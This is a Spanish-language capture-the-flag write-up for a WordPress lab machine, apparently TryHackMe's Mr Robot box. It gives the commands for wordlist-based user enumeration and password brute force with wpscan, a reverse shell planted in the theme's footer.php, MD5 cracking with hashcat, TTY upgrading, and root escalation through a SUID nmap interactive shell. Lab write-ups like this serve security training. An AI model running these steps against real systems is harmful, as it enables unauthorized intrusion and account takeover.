PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

-Vamos al puerto 80 y vemos que se trata de un Wordpress

-Enumeramos con Wpscan en busca de usuarios o plugins vulnerables, pero no encontramos nada

-La máquina va por fuerza bruta. En la ruta /robots.txt nos dice que hay un fichero llamado fsocity.dic , los descargamos con wget:
	wget http://10.10.219.180/fsocity.dic

-Vemos cuántas palabras tiene:
	-wc -l fsocity.dic:
		-858160 words

-Son muchísimas, aplicamos un filtro que nos muestre cuantas palabras únicas tiene el diccionario:
	-sort -u: Filtro que nos devuelve solo las palabras únicas
	-cat fsocity.dic | sort -u | wc -l : Nos devuelve las palabras únicas y las cuenta
		11451

-Creamos un nuevo diccionario con las palabras únicas:
	cat fsocity.dic | sort -u > new_dic.txt

-Nos descargamos un exploit de github que sirve para probar usuarios válidos, le pasamos el diccionario que hemos creado:
	-Recurso: https://github.com/sha-16/WpUserEnum/tree/main
	python3 wp-user-enum.py ../../content/new_dic.txt http://10.10.185.132/wp-login.php
	-Usuario: elliot

-Hecemos fuerza bruta con Wpscan con el usuario encontrado y el diccionario personalizado:
	wpscan --url http://10.10.185.132/wp-login.php -U elliot -P /content/new_dic.txt
	Username: elliot, Password: ER28-0652

-Nos autenticamos en /wp-login.php con las credenciales obtenidas y estamos dentro del dashboard de Wordpress

-Editamos el template footer.php y recargamos la página en la ruta http://10.10.185.132/Image/ para obtener la reverse shell
	-Appearance --> Editor --> Footer.php
	-Pegamos la reverse shell de Pentest Monkey

daemon@linux:/$ 


## Escalada de Privilegios


-Somos el usuario Daemon

-Dentro de /home/robot encontramos un archivo 'password.raw-md5' con el hash= 'robot:c3fcd3d76192e4007dfb496cca67e13b'. Es la contraseña en md5 del usuario robot

-Crackeamos la contraseña del hash con hashcat:
	hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
	-m 0: Modo para hashes en formato MD5
	Contraseña: abcdefghijklmnopqrstuvwxyz

-Intentamos Pivotar al usuario robot y no nos deja ya que la tty no es del todo interactiva y la autenticación no funciona bien. Lo intentamos con 'script /dev/null -c bash' pero no funciona bien. Probamos con a tratar la tty con python:
	1-python -c 'import pty; pty.spawn("/bin/bash")'
	2-Control + Z
	3-stty raw -echo;fg
	4-export TERM=screen

-Ahora si nos deja cambiar de usuario:
	su robot
	password: abcdefghijklmnopqrstuvwxyz
	robot@linux:~$

-Buscamos permisos SUID y encontramos el binario nmap:
	-robot@linux:~$ find / -perm /4000 2>/dev/null
		/usr/local/bin/nmap

-Buscamos en Gtfobins pero no nos funciona.

-Buscamos por google y encontramos este este recurso:
	https://www.adamcouch.co.uk/linux-privilege-escalation-setuid-nmap/

-Escalamos privilegios facilmente con el binario nmap, el cual tiene permisos SUID:
	nmap --interactive: Desplegamos una consola de comando con nmap
	nmap> !whoami: Como tenemos permisos SUID ejecutamos comandos como root
	root
	nmap> !sh: Forzamos una shell como root
	#

-Nota: En Gtfobins si que venía el código 'nmap --interactive', pero está en el apartado de Shell.
Esto de el modo 'interactive' solo se puede con versiones de nmap antiguas, las versiones actualizadas no dejan hacerlo.


